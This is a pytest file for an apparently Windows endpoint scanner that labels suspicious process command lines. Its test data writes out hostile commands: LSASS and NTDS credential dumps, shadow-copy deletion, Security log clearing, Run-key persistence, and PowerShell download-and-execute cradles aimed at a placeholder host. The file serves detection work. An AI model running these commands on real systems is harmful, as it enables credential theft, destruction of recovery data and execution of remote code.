"""Context-sensitive command-line labels use synthetic process metadata only."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from wyndoze_infoscanoverload.agent.cmdline import seal_command_lines
from wyndoze_infoscanoverload.agent.collectors import _cmdline_text
from wyndoze_infoscanoverload.agent.crypto import generate_key
from wyndoze_infoscanoverload.core.models import ProcessInfo, ScanReport


def _seal(*processes: ProcessInfo) -> ScanReport:
    report = ScanReport(
        scan_time_utc="2026-10-19T00:00:00Z",
        hostname="synthetic",
        processes=list(processes),
    )
    seal_command_lines(report, generate_key())
    return report


@pytest.mark.parametrize(
    ("name", "line", "expected"),
    [
        (
            "procdump64.exe",
            "procdump64.exe -accepteula -ma LSASS.exe output.dmp",
            {"dump-operation", "sensitive-target"},
        ),
        (
            None,
            '"C:\\Tools\\Procdump64a.exe" -MA lsass C:\\Temp\\out.dmp',
            {"dump-operation", "sensitive-target"},
        ),
        (
            "ntdsutil.exe",
            'ntdsutil.exe "activate instance ntds" ifm "create full C:\\Temp\\ifm" quit',
            {"dump-operation", "sensitive-target"},
        ),
        (
            "vssadmin.exe",
            "vssadmin.exe delete shadows /for=c: /all /quiet",
            {"recovery-delete"},
        ),
        ("wmic.exe", "WMIC shadowcopy delete", {"recovery-delete"}),
        ("wevtutil.exe", "wevtutil.exe clear-log Security", {"eventlog-clear"}),
        (
            "reg.exe",
            (
                r'reg.exe ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" '
                r"/v App /d app.exe"
            ),
            {"autorun-write", "startup-run-key"},
        ),
        (
            "powershell.exe",
            "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')\"",
            {"download-cradle", "invoke-expression"},
        ),
        (
            "powershell.exe",
            'powershell.exe -Command "iwr https://example.invalid/a | iex # run payload"',
            {"download-cradle", "invoke-expression"},
        ),
        (
            "powershell.exe",
            'powershell.exe -Command "$x = iwr https://example.invalid/a; iex $x"',
            {"download-cradle", "invoke-expression"},
        ),
        ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", {"recovery-delete"}),
        ("vssadmin.exe", "vssadmin.exe delete shadows /for=C: /quiet", {"recovery-delete"}),
        (
            "reg.exe",
            (
                r"reg add HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run "
                r"/v App /d app.exe"
            ),
            {"autorun-write", "startup-run-key"},
        ),
    ],
)
def test_contextual_labels(name, line, expected):
    report = _seal(ProcessInfo(name=name, cmdline=line))
    assert set(report.processes[0].cmdline_flags) == expected
    assert expected <= set(report.cmdline_flags)


@pytest.mark.parametrize(
    ("name", "line", "expected"),
    [
        ("procdump.exe", "procdump.exe -ma notepad.exe output.dmp", {"dump-operation"}),
        (
            "procdump64.exe",
            "procdump64.exe -accepteula notepad.exe output.dmp",
            set(),
        ),
        ("ntdsutil.exe", "ntdsutil.exe help", set()),
        ("ntdsutil.exe", 'ntdsutil.exe help "ifm create"', set()),
        ("encoder.exe", "encoder.exe -enc utf8 input.txt", set()),
        ("reg.exe", r"reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run", set()),
        ("reg.exe", r"reg.exe add HKLM\Dummy\CurrentVersion\Run /v App /d app.exe", set()),
        ("wevtutil.exe", "wevtutil.exe query-events Security", set()),
        ("vssadmin.exe", "vssadmin.exe list shadows", set()),
        (
            "vssadmin.exe",
            'vssadmin.exe list shadows "delete shadows /for=c: /all"',
            set(),
        ),
        ("wevtutil.exe", 'wevtutil.exe qe Security /q:"cl Security"', set()),
        ("powershell.exe", "powershell.exe -File downloadstring-iex.ps1", set()),
        ("powershell.exe", "powershell.exe -Command Write-Host 'iwr | iex'", set()),
        ("powershell.exe", "powershell.exe -Command 'iwr | iex'", set()),
        (
            "powershell.exe",
            'powershell.exe -Command "Write-Output hello # iwr | iex"',
            set(),
        ),
        (
            "powershell.exe",
            'powershell.exe -Command "Write-Output hello <# iwr | iex #>"',
            set(),
        ),
        (
            "powershell.exe",
            'powershell.exe -Command "$downloadstring = 1; $iex = 2"',
            set(),
        ),
        (
            "powershell.exe",
            'powershell.exe -Command "Write-Output iex downloadstring"',
            set(),
        ),
        ("cmd.exe", "cmd.exe /c powershell.exe -enc AAAA", set()),
        (
            "procdump.exe",
            r"procdump.exe -ma notepad.exe C:\Temp\lsass.exe",
            {"dump-operation"},
        ),
    ],
)
def test_benign_and_unsupported_invocations_do_not_escalate(name, line, expected):
    report = _seal(ProcessInfo(name=name, cmdline=line))
    flags = set(report.processes[0].cmdline_flags)
    assert flags == expected
    assert not {"dump-operation", "sensitive-target"} <= flags
    assert not flags & {"recovery-delete", "eventlog-clear", "autorun-write"}


def test_process_labels_do_not_combine_unrelated_processes():
    report = _seal(
        ProcessInfo(pid=1, cmdline="powershell.exe -Command iwr https://example.invalid/a"),
        ProcessInfo(pid=2, cmdline="powershell.exe -Command iex $downloaded"),
    )
    assert report.processes[0].cmdline_flags == ["download-cradle"]
    assert report.processes[1].cmdline_flags == ["invoke-expression"]
    assert report.cmdline_flags == ["download-cradle", "invoke-expression"]


def test_per_process_flags_are_bounded():
    with pytest.raises(ValidationError):
        ProcessInfo(cmdline_flags=[f"flag-{index}" for index in range(33)])


def test_collector_preserves_windows_argument_grouping_for_matching():
    line = _cmdline_text(
        [
            r"C:\Program Files\Sysinternals\procdump64.exe",
            "-ma",
            "lsass.exe",
            r"C:\Dump Folder\lsass.dmp",
        ]
    )
    assert line is not None
    report = _seal(ProcessInfo(name="procdump64.exe", cmdline=line))
    assert report.processes[0].cmdline_flags == ["dump-operation", "sensitive-target"]


def test_collector_preserves_powershell_literal_boundary():
    line = _cmdline_text(["powershell.exe", "-Command", "'iwr | iex'"])
    assert line is not None
    report = _seal(ProcessInfo(name="powershell.exe", cmdline=line))
    assert report.processes[0].cmdline_flags == []
